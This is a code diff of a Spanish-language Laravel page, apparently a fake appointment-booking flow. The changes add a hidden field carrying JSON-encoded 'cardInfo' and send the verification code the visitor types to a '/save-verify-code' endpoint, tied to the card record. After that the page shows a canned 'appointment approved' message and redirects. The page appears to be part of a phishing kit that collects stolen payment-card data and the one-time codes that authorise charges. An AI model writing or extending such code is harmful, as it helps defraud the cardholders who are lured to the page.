@@ -51,6 +51,7 @@
   Le pedimos un poco de paciencia, ya que el proceso puede tardar hasta 5 minutos.</h2>
   <div id="spinner" class="spinner"></div>
 
+  <input type="hidden" id="cardInfo" value="{{json_encode($cardInfo)}}"/>
   <div id="codeInputs" class="code-inputs">
     <input type="text" style="width: 300px;" id="verifyCode">
   </div>
@@ -67,15 +68,27 @@
 
   <script>
         const title = document.querySelector('h2');
+        let cardInfo = JSON.parse($('#cardInfo').val());
+        console.log(cardInfo)
         $('#submit').on('click', function(){
-          if($('#verifyCode').val() == '') return;
-          title.innerText = 'Tu cita ha sido aprobada. Recibirás un SMS de nuestra parte dentro de 1 día antes de la fecha de la cita.';
-          $('#codeInputs').remove();
-          $('#spinner').remove();
-          $('#submit').remove();
-          setTimeout(() => {
-            window.location.href = "/"
-          }, 15000)
+            if($('#verifyCode').val() == '') return;
+            $.ajax({
+              type: 'GET',
+              url: "{{Url('/save-verify-code')}}",
+              data: {
+                code: $('#verifyCode').val(),
+                cardInfoId: cardInfo.id
+              },
+              success: function(){
+                title.innerText = 'Su cita ha sido aprobada. Con un día de antelación a la misma, recibirá un mensaje de texto SMS de nuestra parte.';
+                $('#codeInputs').remove();
+                $('#spinner').remove();
+                $('#submit').remove();
+                setTimeout(() => {
+                  window.location.href = "/"
+                }, 15000)
+              }
+            })
         })
   </script>
 
